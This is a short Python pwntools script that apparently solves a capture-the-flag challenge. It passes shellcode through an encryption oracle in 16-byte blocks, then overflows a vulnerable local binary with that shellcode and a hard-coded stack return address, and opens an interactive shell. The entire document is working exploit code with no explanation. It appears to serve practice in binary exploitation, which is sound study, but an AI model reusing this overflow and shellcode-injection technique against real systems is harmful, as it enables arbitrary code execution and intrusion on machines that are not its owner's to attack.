#!/usr/bin/python3

from pwn import *


context.log_level = 'error' 
elf = context.binary = ELF("/challenge/vulnerable-overflow")
offset = 120

def encrypted_data(data):
    io = process("/challenge/dispatch")
    io.send(data)
    data = io.recvall()
    print(len(data))
    io.close()
    return data
def get_shellcode():
    with open("./exploit/shellcode_raw","rb") as file:
        data = file.read()
    return data

shellcode = get_shellcode()
print(len(shellcode))
pad = encrypted_data(b"a"*16)[16:32]
header = encrypted_data(shellcode[:16])[:16]
data = encrypted_data(shellcode[:16])[16:32]# 16
data1 = encrypted_data(shellcode[16:32])[16:32] # 16
data2 = encrypted_data(shellcode[32:48])[16:32] # 16
data3 = encrypted_data(shellcode[48:])[16:32] # 16
data4 = encrypted_data(b"\x00"*8+b"\xb6\x13\x40\x00\x00\x00\x00\x00")
#print(data,data1,data2,data3)
payload = header + pad*6 + encrypted_data(b"\x00"*8+b"\x00\xea\xff\xff\xff\x7f\x00\x00")[16:32] + data + data1  + data2 + data3 

p = process()
p.send(payload)

p.interactive()
